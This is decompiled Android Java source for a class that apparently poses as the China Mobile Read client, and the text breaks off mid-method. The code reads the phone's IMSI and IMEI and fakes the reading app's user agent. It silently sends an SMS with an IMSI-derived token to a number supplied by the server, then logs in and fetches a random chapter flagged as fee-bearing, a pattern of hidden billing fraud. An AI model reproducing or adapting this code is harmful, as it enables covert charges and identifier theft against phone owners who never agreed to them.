package com.amaz.onib;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Proxy;
import android.os.Build;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Xml;
import android.view.Display;
import android.view.WindowManager;
import bn.sdk.szwcsss.common.az.code.b.Cint;
import com.amaz.onib.r;
import com.umeng.analytics.pro.x;
import com.yf.y.f.init.util.ConstUtils;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.StringWriter;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.apache.http.Header;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;
import org.xmlpull.v1.XmlSerializer;
/* loaded from: classes.dex */
public class bk {
    private static Context d;
    private static String l;
    private static String o;
    private static String p;
    private static String q;

    /* renamed from: a  reason: collision with root package name */
    public static boolean f674a = false;
    private static String e = "CMREADBC_Android_WH_V5.80_specprein_160126";
    private static String f = "d1Ae70rMc4";
    private static String g = "720*1280";
    private static String h = "M32N0006";
    private static String i = "";
    private static String j = "";
    private static String k = "";
    private static String m = "";
    private static String n = "10658421";
    private static String r = "";
    private static String s = "";
    public static String b = "";
    private static Map<String, String> t = new HashMap();
    private static Map<String, String> u = new HashMap();
    private static List<String> v = new ArrayList();
    private static List<String> w = new ArrayList();
    public static Map<Integer, String> c = new HashMap();

    static {
        c.put(1, "激活成功");
        c.put(2, "失败");
        c.put(3, "小说参数错误");
        c.put(4, "注册失败");
        c.put(5, "获取书籍分类失败");
        c.put(6, "获取某个类别书籍列表失败");
        c.put(7, "获取书籍详情失败");
        c.put(8, "获取章节内容失败");
        c.put(9, "获取Token失败");
        c.put(10, "未知错误");
        c.put(11, "发送短信失败");
        c.put(12, "获取接入号失败或未插入手机卡");
        c.put(13, "阅读成功");
        c.put(14, "未获取到IMSI");
    }

    public static int a(Context context, String str, String str2) {
        k = "";
        d = context;
        h = str;
        b = str2;
        f674a = false;
        Display defaultDisplay = ((WindowManager) context.getSystemService("window")).getDefaultDisplay();
        g = defaultDisplay.getWidth() + "*" + defaultDisplay.getHeight();
        SharedPreferences a2 = bw.a(d);
        m = a2.getString("userid", "00001");
        s = a2.getString("longtoken", "");
        i = a2.getString("msisdn", "");
        if (TextUtils.isEmpty(FSrvi.IMSI)) {
            return 14;
        }
        if (TextUtils.isEmpty(s)) {
            return c();
        }
        g();
        return e();
    }

    private static int a(String str, String str2) {
        t.put(Cint.b, "application/xml");
        l();
        String e2 = e(s, m);
        String valueOf = String.valueOf(((int) (9000.0d * Math.random())) + 1000);
        t.put(Cint.b, "application/xml");
        t.put("Action", "getChapterInfo2");
        t.put("APIVersion", "1.0.0");
        t.put("Client-Agent", e + "/" + g + "/xxxxxxxx");
        t.put("ClientHash", j);
        t.put("cltk", d(e2, valueOf + m));
        t.put("feeType", "1");
        t.put("random", valueOf);
        t.put("IMSI", FSrvi.IMSI);
        t.put("isSupportGuest", "1");
        t.put("magazineVersion", "3.0");
        t.put("miguVersionFlag", "1");
        t.put("terminalUniqueId", FSrvi.IMEI);
        t.put("user-id", m);
        t.put("X-Channel-Code", h);
        t.put("x-cmread-msisdn", i);
        t.put("x-cmread-login-type", "3");
        t.put("x-up-bear-type", "WLAN");
        return TextUtils.isEmpty(e(a(new StringBuilder().append("http://client.cmread.com/cmread/portalapi").append(new StringBuilder().append("?contentId=").append(str).append("&chapterId=").append(str2).append("&fetchRemaining=1&offset=0&pageId=-99&blockId=-1&formatType=3&isSupportRTF=1&chargeOrAd=2").toString()).toString(), null, t, false))) ? 8 : 13;
    }

    public static String a() {
        p = UUID.randomUUID().toString().replaceAll("-", "");
        q = by.a(FSrvi.IMSI.getBytes()).toLowerCase();
        o = q + p;
        return o;
    }

    /* JADX WARN: Removed duplicated region for block: B:51:0x00f3 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static String a(String str, Map<String, String> map) {
        BufferedReader bufferedReader;
        Exception e2;
        HttpResponse execute;
        BufferedReader bufferedReader2 = null;
        BufferedReader bufferedReader3 = null;
        try {
            DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
            defaultHttpClient.getParams().setIntParameter("http.socket.timeout", 30000);
            defaultHttpClient.getParams().setIntParameter("http.connection.timeout", 30000);
            if (Proxy.getDefaultHost() != null) {
                defaultHttpClient.getParams().setParameter("http.route.default-proxy", new HttpHost(Proxy.getDefaultHost(), Proxy.getDefaultPort()));
            }
            HttpPost httpPost = new HttpPost(str);
            httpPost.addHeader(Cint.b, "application/json; charset=utf-8");
            if (map != null && !map.isEmpty()) {
                if (map.get("XML") != null) {
                    httpPost.setEntity(new StringEntity(map.get("XML")));
                } else {
                    StringBuilder sb = new StringBuilder();
                    for (String str2 : map.keySet()) {
                        sb.append(str2).append("=").append(map.get(str2)).append("&");
                    }
                    sb.deleteCharAt(sb.length() - 1);
                    httpPost.setEntity(new StringEntity(sb.toString()));
                }
            }
            execute = defaultHttpClient.execute(httpPost);
        } catch (Exception e3) {
            e2 = e3;
            bufferedReader = null;
        } catch (Throwable th) {
            th = th;
            if (bufferedReader2 != null) {
            }
            throw th;
        }
        if (execute.getStatusLine().getStatusCode() == 200) {
            bufferedReader = new BufferedReader(new InputStreamReader(execute.getEntity().getContent()));
            try {
                try {
                    StringBuilder sb2 = new StringBuilder();
                    for (String readLine = bufferedReader.readLine(); readLine != null; readLine = bufferedReader.readLine()) {
                        sb2.append(readLine);
                    }
                    String sb3 = sb2.toString();
                    if (bufferedReader == null) {
                        return sb3;
                    }
                    try {
                        bufferedReader.close();
                        return sb3;
                    } catch (IOException e4) {
                        return sb3;
                    }
                } catch (Exception e5) {
                    e2 = e5;
                    e2.printStackTrace();
                    if (bufferedReader != null) {
                        try {
                            bufferedReader.close();
                        } catch (IOException e6) {
                        }
                    }
                    return null;
                }
            } catch (Throwable th2) {
                th = th2;
                bufferedReader2 = bufferedReader;
                if (bufferedReader2 != null) {
                    try {
                        bufferedReader2.close();
                    } catch (IOException e7) {
                    }
                }
                throw th;
            }
        } else {
            if (0 != 0) {
                try {
                    bufferedReader3.close();
                } catch (IOException e8) {
                }
            }
            return null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:74:0x0157 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static String a(String str, Map<String, String> map, Map<String, String> map2, boolean z) {
        BufferedReader bufferedReader;
        Exception e2;
        HttpResponse execute;
        BufferedReader bufferedReader2 = null;
        try {
            DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
            defaultHttpClient.getParams().setIntParameter("http.socket.timeout", 30000);
            defaultHttpClient.getParams().setIntParameter("http.connection.timeout", 30000);
            if (Proxy.getDefaultHost() != null) {
                defaultHttpClient.getParams().setParameter("http.route.default-proxy", new HttpHost(Proxy.getDefaultHost(), Proxy.getDefaultPort()));
            }
            HttpPost httpPost = new HttpPost(str);
            a(httpPost, map2);
            if (!TextUtils.isEmpty(k) && !z) {
                httpPost.setHeader(Cint.h, k);
            }
            if (map != null && !map.isEmpty()) {
                if (map.get("XML") != null) {
                    httpPost.setEntity(new StringEntity(map.get("XML")));
                } else {
                    StringBuilder sb = new StringBuilder();
                    for (String str2 : map.keySet()) {
                        sb.append(str2).append("=").append(map.get(str2)).append("&");
                    }
                    sb.deleteCharAt(sb.length() - 1);
                    httpPost.setEntity(new StringEntity(sb.toString()));
                }
            }
            execute = defaultHttpClient.execute(httpPost);
        } catch (Exception e3) {
            e2 = e3;
            bufferedReader = null;
        } catch (Throwable th) {
            th = th;
            if (bufferedReader2 != null) {
            }
            throw th;
        }
        if (execute.getStatusLine().getStatusCode() == 200) {
            if (TextUtils.isEmpty(i)) {
                i = execute.getFirstHeader("visitorMsisdn").getValue();
            }
            String value = execute.getFirstHeader("result-code").getValue();
            Header[] headers = execute.getHeaders(Cint.i);
            if (headers != null && headers.length > 0) {
                for (Header header : headers) {
                    if (header.getValue().contains("JSESSIONID")) {
                        l = header.getValue();
                        l = l.substring(l.indexOf("JSESSIONID=") + 11, l.indexOf(";", l.indexOf("JSESSIONID=")));
                        k = "JSESSIONID=" + l;
                    }
                }
            }
            if (!"9001".equals(value) && !"9002".equals(value) && !"9003".equals(value)) {
                bufferedReader = new BufferedReader(new InputStreamReader(execute.getEntity().getContent()));
                try {
                    try {
                        StringBuilder sb2 = new StringBuilder();
                        for (String readLine = bufferedReader.readLine(); readLine != null; readLine = bufferedReader.readLine()) {
                            sb2.append(readLine);
                        }
                        String sb3 = sb2.toString();
                        if (bufferedReader == null) {
                            return sb3;
                        }
                        try {
                            bufferedReader.close();
                            return sb3;
                        } catch (IOException e4) {
                            return sb3;
                        }
                    } catch (Exception e5) {
                        e2 = e5;
                        e2.printStackTrace();
                        if (bufferedReader != null) {
                            try {
                                bufferedReader.close();
                            } catch (IOException e6) {
                            }
                        }
                        return null;
                    }
                } catch (Throwable th2) {
                    th = th2;
                    bufferedReader2 = bufferedReader;
                    if (bufferedReader2 != null) {
                        try {
                            bufferedReader2.close();
                        } catch (IOException e7) {
                        }
                    }
                    throw th;
                }
            } else if (0 == 0) {
                return "tryAgain";
            } else {
                try {
                    bufferedReader2.close();
                    return "tryAgain";
                } catch (IOException e8) {
                    return "tryAgain";
                }
            }
        } else {
            if (0 != 0) {
                try {
                    bufferedReader2.close();
                } catch (IOException e9) {
                }
            }
            return null;
        }
    }

    private static void a(String str) {
        t.put(Cint.b, "application/xml");
        m = "00000";
        String e2 = e(str, e + f);
        l();
        b(e2, "1");
        String j2 = j();
        HashMap hashMap = new HashMap();
        hashMap.put("XML", j2);
        t.put("Action", "authenticate4");
        t.put("ClientHash", j);
        t.put("user-id", m);
        t.put("X-Channel-Code", h);
        t.put("x-cmread-msisdn", "");
        t.put("x-cmread-login-type", "2");
        t.put("x-up-bear-type", "WLAN");
        d(a("http://client.cmread.com/cmread/portalapi", hashMap, t, true));
        if (!TextUtils.isEmpty(s) && !TextUtils.isEmpty(m)) {
            f674a = true;
        }
    }

    private static void a(HttpPost httpPost, Map<String, String> map) {
        httpPost.addHeader("Action", map.get("Action"));
        httpPost.addHeader("APIVersion", map.get("APIVersion"));
        httpPost.addHeader("Client-Agent", map.get("Client-Agent"));
        httpPost.addHeader("ClientHash", map.get("ClientHash"));
        httpPost.addHeader("cltk", map.get("cltk"));
        httpPost.addHeader("encoding-type", map.get("encoding-type"));
        httpPost.addHeader("feeType", map.get("feeType"));
        httpPost.addHeader("IMSI", map.get("IMSI"));
        httpPost.addHeader("isSupportGuest", map.get("isSupportGuest"));
        httpPost.addHeader("magazineVersion", map.get("magazineVersion"));
        httpPost.addHeader("miguVersionFlag", map.get("miguVersionFlag"));
        if (!TextUtils.isEmpty(map.get("random"))) {
            httpPost.addHeader("random", map.get("random"));
        }
        httpPost.addHeader("terminalUniqueId", map.get("terminalUniqueId"));
        httpPost.addHeader("user-id", map.get("user-id"));
        httpPost.addHeader("X-Channel-Code", map.get("X-Channel-Code"));
        httpPost.addHeader(Cint.b, map.get(Cint.b));
        httpPost.addHeader("x-cmread-msisdn", map.get("x-cmread-msisdn"));
        httpPost.addHeader("x-cmread-login-type", map.get("x-cmread-login-type"));
        httpPost.addHeader("x-up-bear-type", map.get("x-up-bear-type"));
    }

    public static int b() {
        f674a = false;
        if (!"200".equals(d())) {
            return 2;
        }
        String f2 = f();
        try {
            if ("tryAgain".equals(f2)) {
                Thread.sleep(5000L);
                String f3 = f();
                if (TextUtils.isEmpty(f3) || "tryAgain".equals(f3)) {
                    return 9;
                }
                a(f3);
            } else if (!TextUtils.isEmpty(f2)) {
                a(f2);
            }
            if (TextUtils.isEmpty(s) || TextUtils.isEmpty(m)) {
                return 4;
            }
            bw.a(d, m, s, i);
            g();
            return e();
        } catch (InterruptedException e2) {
            return 10;
        }
    }

    private static Map<String, String> b(String str) {
        if (!TextUtils.isEmpty(str)) {
            try {
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(str.getBytes());
                XmlPullParser newPullParser = XmlPullParserFactory.newInstance().newPullParser();
                newPullParser.setInput(byteArrayInputStream, "utf-8");
                HashMap hashMap = new HashMap();
                String str2 = "";
                for (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {
                    switch (eventType) {
                        case 2:
                            if (!"key".equalsIgnoreCase(newPullParser.getName())) {
                                if ("value".equalsIgnoreCase(newPullParser.getName())) {
                                    hashMap.put(str2, newPullParser.nextText());
                                    break;
                                } else {
                                    break;
                                }
                            } else {
                                str2 = newPullParser.nextText();
                                hashMap.put(str2, "");
                                break;
                            }
                    }
                }
                if (byteArrayInputStream == null) {
                    return hashMap;
                }
                byteArrayInputStream.close();
                return hashMap;
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return null;
    }

    private static void b(String str, String str2) {
        StringBuffer stringBuffer = new StringBuffer(str);
        stringBuffer.append(f);
        stringBuffer.append(str2);
        byte[] bArr = null;
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.reset();
            bArr = messageDigest.digest(stringBuffer.toString().getBytes());
        } catch (NoSuchAlgorithmException e2) {
            e2.printStackTrace();
        }
        r = bp.a(bArr);
    }

    public static int c() {
        String h2 = h();
        HashMap hashMap = new HashMap();
        hashMap.put("XML", h2);
        m = "00001";
        l();
        t.put("Action", "getDescriptions");
        t.put("APIVersion", "1.0.0");
        t.put("Client-Agent", e + "/" + g + "/xxxxxxxx");
        t.put("ClientHash", j);
        t.put("cltk", "");
        t.put("feeType", "1");
        t.put("IMSI", FSrvi.IMSI);
        t.put("isSupportGuest", "1");
        t.put("magazineVersion", "3.0");
        t.put("miguVersionFlag", "1");
        t.put("terminalUniqueId", FSrvi.IMEI);
        t.put("user-id", m);
        t.put("X-Channel-Code", h);
        t.put(Cint.b, "application/xml");
        t.put("x-cmread-msisdn", i);
        t.put("x-cmread-login-type", "4");
        t.put("x-up-bear-type", "WLAN");
        Map<String, String> b2 = b(a("http://client.cmread.com/cmread/portalapi", hashMap, t, false));
        if (b2 == null || b2.size() == 0) {
            return 12;
        }
        String str = Build.VERSION.SDK_INT >= 16 ? b2.get("pub_reserve_bc_page_id") : b2.get("pub_client_smstoken_switch");
        if (TextUtils.isEmpty(str)) {
            return 12;
        }
        String[] split = str.replace(",{", "|").split("\\|");
        if (split.length < 3) {
            return 12;
        }
        if (1 == bv.a(d)) {
            n = split[2];
            n = n.substring(2, n.length() - 1);
        } else if (2 == bv.a(d)) {
            n = split[1];
            n = n.substring(2, n.length() - 1);
        } else if (bv.a(d) != 0) {
            return 12;
        } else {
            n = split[0];
            n = n.substring(3, n.length() - 1);
        }
        String a2 = a();
        if (TextUtils.isEmpty(n) || TextUtils.isEmpty(a2)) {
            return 12;
        }
        SmsManager.getDefault().sendTextMessage(n, null, a2, PendingIntent.getBroadcast(d, 0, new Intent(Utils.ACTION_MIGU_SNED_SUCC), 0), null);
        return 0;
    }

    private static String c(String str) {
        Exception e2;
        String str2;
        String str3 = "tryAgain";
        if (!TextUtils.isEmpty(str) && !"tryAgain".equals(str)) {
            try {
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(str.getBytes());
                XmlPullParser newPullParser = XmlPullParserFactory.newInstance().newPullParser();
                newPullParser.setInput(byteArrayInputStream, "utf-8");
                int eventType = newPullParser.getEventType();
                while (eventType != 1) {
                    switch (eventType) {
                        case 2:
                            if ("token".equalsIgnoreCase(newPullParser.getName())) {
                                str2 = newPullParser.nextText();
                                break;
                            }
                        default:
                            str2 = str3;
                            break;
                    }
                    try {
                        eventType = newPullParser.next();
                        str3 = str2;
                    } catch (Exception e3) {
                        e2 = e3;
                        str3 = str2;
                        e2.printStackTrace();
                        return str3;
                    }
                }
                if (byteArrayInputStream != null) {
                    byteArrayInputStream.close();
                }
            } catch (Exception e4) {
                e2 = e4;
            }
        }
        return str3;
    }

    private static String c(String str, String str2) {
        byte[] bytes = str.getBytes();
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(str2.getBytes());
            byte[] digest = messageDigest.digest();
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(1, new SecretKeySpec(digest, "AES"));
            return bp.a(cipher.doFinal(bytes));
        } catch (Exception e2) {
            return "";
        }
    }

    public static String d() {
        String str = "{\"port\":\"" + n + "\",\"operator\":\"cmcc\",\"sms_content\":\"" + o + "\",\"phone_number\":\"\"}";
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("version", e);
            jSONObject.put("channelID", h);
            jSONObject.put("UA", "CMREADBC_Android_1080*1920_V5.80(1080*1920;OPPO;R7t;Android 4.4.4;cn;);");
            jSONObject.put("terminalID", FSrvi.IMEI);
            jSONObject.put("OS", "Android");
            jSONObject.put("msisdn", i);
            jSONObject.put("recordTime", by.a());
            jSONObject.put("eventType", "1");
            jSONObject.put("eventID", "210001");
            jSONObject.put("linkNumber", "");
            jSONObject.put("jsessionId", l);
            jSONObject.put("accountName", i);
            jSONObject.put("bearType", "WLAN");
            jSONObject.put("exCloumn1", i);
            jSONObject.put("exCloumn2", "");
            jSONObject.put("exCloumn3", "");
            jSONObject.put("exCloumn4", "");
            jSONObject.put("exCloumn5", "");
            jSONObject.put("params", str);
        } catch (Exception e2) {
        }
        HashMap hashMap = new HashMap();
        hashMap.put("XML", jSONObject.toString());
        try {
            return new JSONObject(a("http://biss.cmread.com:8080/etl/client", hashMap)).optString("resCode");
        } catch (JSONException e3) {
            e3.printStackTrace();
            return "0";
        }
    }

    private static String d(String str, String str2) {
        byte[] bytes = str.getBytes();
        try {
            byte[] bytes2 = str2.substring(0, 16).getBytes("UTF-8");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(1, new SecretKeySpec(bytes2, "AES"));
            return bp.a(cipher.doFinal(bytes));
        } catch (Exception e2) {
            return "";
        }
    }

    private static void d(String str) {
        if (!TextUtils.isEmpty(str)) {
            try {
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(str.getBytes());
                XmlPullParser newPullParser = XmlPullParserFactory.newInstance().newPullParser();
                newPullParser.setInput(byteArrayInputStream, "utf-8");
                for (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {
                    switch (eventType) {
                        case 2:
                            if (!"userID".equalsIgnoreCase(newPullParser.getName())) {
                                if (!"longToken".equalsIgnoreCase(newPullParser.getName())) {
                                    if ("msisdn".equalsIgnoreCase(newPullParser.getName())) {
                                        i = newPullParser.nextText();
                                        break;
                                    } else {
                                        break;
                                    }
                                } else {
                                    s = newPullParser.nextText();
                                    break;
                                }
                            } else {
                                m = newPullParser.nextText();
                                break;
                            }
                    }
                }
                if (byteArrayInputStream != null) {
                    byteArrayInputStream.close();
                }
                s = c(s, m);
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
    }

    public static int e() {
        String str;
        String e2 = e(s, m);
        String str2 = String.valueOf(((int) (Math.random() * 9000.0d)) + 1000) + m;
        try {
            r c2 = t.a("http://wap.cmread.com/rbc/p/tsfl.jsp?vt=3&timestamp=" + String.valueOf(System.currentTimeMillis()) + "&cm=" + h).c(false);
            c2.b(Cint.d, "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            c2.b(Cint.g, "CMREADBC_Android_1080*1920_V5.80(1080*1920;OPPO;R7t;Android 4.4.4;cn;);");
            c2.b(Cint.f, "");
            c2.b("X-Requested-With", "com.andreader.prein");
            c2.b("Language", "zh-CN,en-US;q=0.8");
            c2.b("client_version", e);
            c2.b("cltk", d(e2, str2));
            c2.b("isintegmediaplug", "1");
            c2.b("mmisinstall", "-1");
            c2.b("terminalUniqueId", FSrvi.IMEI);
            c2.b("x-user-id", m);
            c2.a(ConstUtils.MIN);
            if (!TextUtils.isEmpty(k)) {
                c2.c("JSESSIONID", k.replace("JSESSIONID=", ""));
            }
            r.e c3 = c2.c();
            Map<String, String> d2 = c3.d();
            for (String str3 : d2.keySet()) {
                c2.c(str3, d2.get(str3));
                if ("JSESSIONID".equals(str3)) {
                    k = str3 + "=" + d2.get(str3);
                }
            }
            String f2 = c3.f();
            v.clear();
            for (w wVar : x.a(f2, "a")) {
                if (wVar.a("href") != null && wVar.a("href").startsWith("/rbc/p/")) {
                    v.add("http://wap.cmread.com" + wVar.a("href"));
                }
            }
            if (v.size() == 0) {
                return 5;
            }
            Random random = new Random();
            int nextInt = random.nextInt(v.size());
            c2.b(Cint.e, "zh-CN,en-US;q=0.8");
            c2.b(Cint.f, "");
            c2.b("cltk", d(e2, String.valueOf(((int) (Math.random() * 9000.0d)) + 1000) + m));
            c2.b("client_version", e);
            c2.b("isintegmediaplug", "1");
            c2.b("mmisinstall", "-1");
            c2.b("terminalUniqueId", FSrvi.IMEI);
            c2.b("x-user-id", m);
            c2.a(v.get(nextInt));
            c2.a(ConstUtils.MIN);
            try {
                String a2 = c2.a();
                w.clear();
                for (w wVar2 : x.a(a2, "a")) {
                    if ((wVar2.a("href") != null && wVar2.a("href").contains("/index.htm?ln=")) || wVar2.a("href").contains("index.htm;jsessionid=")) {
                        w.add("http://wap.cmread.com" + wVar2.a("href"));
                    }
                }
                if (w.size() == 0) {
                    return 6;
                }
                int nextInt2 = random.nextInt(w.size());
                c2.b(Cint.e, "zh-CN,en-US;q=0.8");
                c2.b(Cint.f, "");
                c2.b("cltk", d(e2, String.valueOf(((int) (Math.random() * 9000.0d)) + 1000) + m));
                c2.b("client_version", e);
                c2.b("isintegmediaplug", "1");
                c2.b("mmisinstall", "-1");
                c2.b("terminalUniqueId", FSrvi.IMEI);
                c2.b("x-user-id", m);
                c2.a(w.get(nextInt2));
                c2.a(ConstUtils.MIN);
                try {
                    String str4 = "";
                    String str5 = "";
                    Iterator<w> it = x.a(c2.a(), "input").iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            str = str5;
                            break;
                        }
                        w next = it.next();
                        if (next.a("id") != null && next.a("id").contains("bookidH")) {
                            str4 = next.a("value");
                        }
                        str = (next.a("id") == null || !next.a("id").contains("chapteridH")) ? str5 : next.a("value");
                        if (!(TextUtils.isEmpty(str4) || TextUtils.isEmpty(str))) {
                            break;
                        }
                        str5 = str;
                    }
                    if (TextUtils.isEmpty(str4) || TextUtils.isEmpty(str)) {
                        return 8;
                    }
                    return a(str4, str);
                } catch (IOException e3) {
                    return 7;
                }
            } catch (IOException e4) {
                return 6;
            }
        } catch (Exception e5) {
            return 5;
        }
    }

    private static String e(String str) {
        if (!TextUtils.isEmpty(str)) {
            try {
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(str.getBytes());
                XmlPullParser newPullParser = XmlPullParserFactory.newInstance().newPullParser();
                newPullParser.setInput(byteArrayInputStream, "utf-8");
                String str2 = "";
                boolean z = true;
                for (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {
                    switch (eventType) {
                        case 2:
                            if (!"ChapterInfo".equalsIgnoreCase(newPullParser.getName())) {
                                if ("chapterID".equalsIgnoreCase(newPullParser.getName())) {
                                    if (z) {
                                        str2 = newPullParser.nextText();
                                        break;
                                    } else {
                                        break;
                                    }
                                } else if ("NextChapter".equalsIgnoreCase(newPullParser.getName())) {
                                    z = false;
                                    break;
                                } else {
                                    break;
                                }
                            } else {
                                z = true;
                                break;
                            }
                    }
                }
                if (byteArrayInputStream == null) {
                    return str2;
                }
                byteArrayInputStream.close();
                return str2;
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return "";
    }

    private static String e(String str, String str2) {
        byte[] a2 = bp.a(str);
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(str2.getBytes());
            SecretKeySpec secretKeySpec = new SecretKeySpec(messageDigest.digest(), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(2, secretKeySpec);
            return new String(cipher.doFinal(a2));
        } catch (Exception e2) {
            e2.printStackTrace();
            return "";
        }
    }

    private static String f() {
        t.put(Cint.b, "application/xml");
        String i2 = i();
        HashMap hashMap = new HashMap();
        hashMap.put("XML", i2);
        l();
        t.put("Action", "getToken");
        t.put("ClientHash", j);
        t.put("user-id", m);
        t.put("X-Channel-Code", h);
        t.put("x-cmread-msisdn", "");
        t.put("x-cmread-login-type", "2");
        t.put("x-up-bear-type", "WLAN");
        return c(a("http://client.cmread.com/cmread/portalapi", hashMap, t, false));
    }

    private static void g() {
        t.put(Cint.b, "application/xml");
        l();
        String e2 = e(s, m);
        String valueOf = String.valueOf(((int) (9000.0d * Math.random())) + 1000);
        String k2 = k();
        HashMap hashMap = new HashMap();
        hashMap.put("XML", k2);
        t.put(Cint.b, "application/xml");
        t.put("Action", "saveAOIToken");
        t.put("APIVersion", "1.0.0");
        t.put("Client-Agent", e + "/" + g + "/xxxxxxxx");
        t.put("ClientHash", j);
        t.put("cltk", d(e2, valueOf + m));
        t.put("feeType", "1");
        t.put("random", valueOf);
        t.put("IMSI", FSrvi.IMSI);
        t.put("isSupportGuest", "1");
        t.put("magazineVersion", "3.0");
        t.put("miguVersionFlag", "1");
        t.put("terminalUniqueId", FSrvi.IMEI);
        t.put("user-id", m);
        t.put("X-Channel-Code", h);
        t.put("x-cmread-msisdn", i);
        t.put("x-cmread-login-type", "3");
        t.put("x-up-bear-type", "WLAN");
        a("http://client.cmread.com/cmread/portalapi", hashMap, t, false);
    }

    private static String h() {
        XmlSerializer newSerializer = Xml.newSerializer();
        StringWriter stringWriter = new StringWriter();
        try {
            newSerializer.setOutput(stringWriter);
            newSerializer.startDocument("utf-8", null);
            newSerializer.startTag("", "Request");
            newSerializer.startTag("", "GetDescriptionsReq");
            newSerializer.startTag("", "KeyList");
            newSerializer.startTag("", "key");
            newSerializer.text("pub_client_smstoken_switch");
            newSerializer.endTag("", "key");
            newSerializer.startTag("", "key");
            newSerializer.text("pub_client_sms_switch");
            newSerializer.endTag("", "key");
            newSerializer.startTag("", "key");
            newSerializer.text("pub_reserve_bc_page_id");
            newSerializer.endTag("", "key");
            newSerializer.endTag("", "KeyList");
            newSerializer.endTag("", "GetDescriptionsReq");
            newSerializer.endTag("", "Request");
            newSerializer.endDocument();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return stringWriter.toString();
    }

    private static String i() {
        XmlSerializer newSerializer = Xml.newSerializer();
        StringWriter stringWriter = new StringWriter();
        try {
            newSerializer.setOutput(stringWriter);
            newSerializer.startDocument("utf-8", null);
            newSerializer.startTag("", "Request");
            newSerializer.startTag("", "GetTokenReq");
            newSerializer.startTag("", "random");
            newSerializer.text(p);
            newSerializer.endTag("", "random");
            newSerializer.startTag("", "simsi");
            newSerializer.text(q);
            newSerializer.endTag("", "simsi");
            newSerializer.endTag("", "GetTokenReq");
            newSerializer.endTag("", "Request");
            newSerializer.endDocument();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return stringWriter.toString();
    }

    private static String j() {
        XmlSerializer newSerializer = Xml.newSerializer();
        StringWriter stringWriter = new StringWriter();
        try {
            newSerializer.setOutput(stringWriter);
            newSerializer.startDocument("utf-8", null);
            newSerializer.startTag("", "Request");
            newSerializer.startTag("", "Authenticate4Req");
            newSerializer.startTag("", x.b);
            newSerializer.text(h);
            newSerializer.endTag("", x.b);
            newSerializer.startTag("", "clientHash");
            newSerializer.text(j);
            newSerializer.endTag("", "clientHash");
            newSerializer.startTag("", "cataloglist");
            newSerializer.text("false");
            newSerializer.endTag("", "cataloglist");
            newSerializer.startTag("", "systembookmark");
            newSerializer.text("false");
            newSerializer.endTag("", "systembookmark");
            newSerializer.startTag("", "catalogTimestamp");
            newSerializer.text("19700101000000");
            newSerializer.endTag("", "catalogTimestamp");
            newSerializer.startTag("", "includeResponse");
            newSerializer.text("true");
            newSerializer.endTag("", "includeResponse");
            newSerializer.startTag("", "simsi");
            newSerializer.text(q);
            newSerializer.endTag("", "simsi");
            newSerializer.startTag("", "counter");
            newSerializer.text("1");
            newSerializer.endTag("", "counter");
            newSerializer.startTag("", "stoken");
            newSerializer.text(r);
            newSerializer.endTag("", "stoken");
            newSerializer.startTag("", "random");
            newSerializer.text(p);
            newSerializer.endTag("", "random");
            newSerializer.startTag("", "homeChannelID");
            newSerializer.text("48");
            newSerializer.endTag("", "homeChannelID");
            newSerializer.startTag("", "rspExceptCodeList");
            newSerializer.startTag("", "nodeName");
            newSerializer.text("welcomeinfo");
            newSerializer.endTag("", "nodeName");
            newSerializer.startTag("", "nodeName");
            newSerializer.text("messagecount");
            newSerializer.endTag("", "nodeName");
            newSerializer.startTag("", "nodeName");
            newSerializer.text("bookmark");
            newSerializer.endTag("", "nodeName");
            newSerializer.startTag("", "nodeName");
            newSerializer.text("txtadlist");
            newSerializer.endTag("", "nodeName");
            newSerializer.startTag("", "nodeName");
            newSerializer.text("ticketinfo");
            newSerializer.endTag("", "nodeName");
            newSerializer.startTag("", "nodeName");
            newSerializer.text("purchaseticket");
            newSerializer.endTag("", "nodeName");
            newSerializer.startTag("", "nodeName");
            newSerializer.text("pagelist");
            newSerializer.endTag("", "nodeName");
            newSerializer.endTag("", "rspExceptCodeList");
            newSerializer.endTag("", "Authenticate4Req");
